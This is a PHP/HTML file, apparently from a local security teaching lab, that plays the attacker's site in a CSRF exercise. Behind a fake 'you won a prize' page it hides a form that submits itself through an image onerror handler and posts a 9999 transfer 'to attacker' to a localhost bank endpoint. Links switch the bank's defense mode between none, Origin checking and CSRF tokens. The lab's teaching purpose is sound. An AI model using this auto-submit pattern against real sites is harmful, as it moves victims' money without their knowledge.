<!doctype html>
<?php
// Q41 攻击者的站点：一个「看起来无害」的页面，里面藏着自动提交的表单。
// 受害者如果已经登录银行，浏览器会自动带上银行的 cookie 发这个 POST。
//
// 用浏览器打开才能真正触发；用 curl 看不到「浏览器自动带 cookie」这一步。
$mode = $_GET['mode'] ?? 'none';
$base = 'http://localhost:9311/bench/network/q41/csrf-bank.php';
?>
<html lang="zh">
<head><meta charset="utf-8"><title>免费领奖 · 攻击者站点</title></head>
<body style="background:#ffe">
<h1>🎁 恭喜你获得一等奖</h1>
<p>请稍候，正在为你领取奖品……</p>

<!-- 关键：这是一个隐藏的、会自动提交的跨站表单 -->
<form id="evil" method="post" action="<?= htmlspecialchars($base) ?>?mode=<?= htmlspecialchars($mode) ?>" style="display:none">
  <input name="to" value="attacker">
  <input name="amount" value="9999">
</form>
<img src="x" onerror="document.getElementById('evil').submit()" alt="">

<p>（这个页面在真实浏览器里会立刻向银行发起一次转账 POST。
    受害者看不到任何跳转，因为目标是允许跨站表单提交的普通 endpoint。）</p>
<p>银行当前的防护模式是 <b><?= htmlspecialchars($mode) ?></b>：
   <a href="?mode=none">无防护</a> ·
   <a href="?mode=origin">Origin 校验</a> ·
   <a href="?mode=token">CSRF token</a></p>
</body>
</html>
